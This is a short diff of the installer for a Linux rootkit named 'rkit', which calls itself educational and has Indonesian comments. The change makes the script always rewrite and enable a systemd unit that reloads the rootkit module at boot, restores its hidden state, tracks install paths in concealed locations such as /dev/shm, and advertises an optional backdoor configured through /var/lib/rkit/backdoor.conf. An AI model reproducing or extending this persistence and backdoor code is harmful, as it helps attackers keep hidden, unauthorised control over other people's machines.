@@ -144,8 +144,9 @@ fi
 # ----------------8. auto-load saat boot (state restore) ----------------
 mkdir -p /var/lib/rkit
 UNIT=/etc/systemd/system/rkit-load.service
-if [ ! -f "$UNIT" ]; then
-	cat > "$UNIT" <<UNITEOF
+# tulis ULANG setiap install — $ROOT bisa berpindah (mis. /dev/shm -> /opt/.cache)
+# dulu ada guard "kalau belum ada" -> unit lama/path basi dipertahankan (bug).
+cat > "$UNIT" <<UNITEOF
 [Unit]
 Description=rkit module loader (edukasi)
 After=local-fs.target
@@ -158,8 +159,7 @@ RemainAfterExit=yes
 [Install]
 WantedBy=multi-user.target
 UNITEOF
-	echo "[+] $UNIT dibuat"
-fi
+echo "[+] $UNIT ditulis -> $ROOT"
 if systemctl daemon-reload 2>/dev/null && systemctl enable rkit-load.service 2>/dev/null; then
 	echo "[+] autoload boot aktif (state hide dipulihkan dari /var/lib/rkit/state)"
 	echo "    backdoor (opsional) via auto-load — buat /var/lib/rkit/backdoor.conf:"
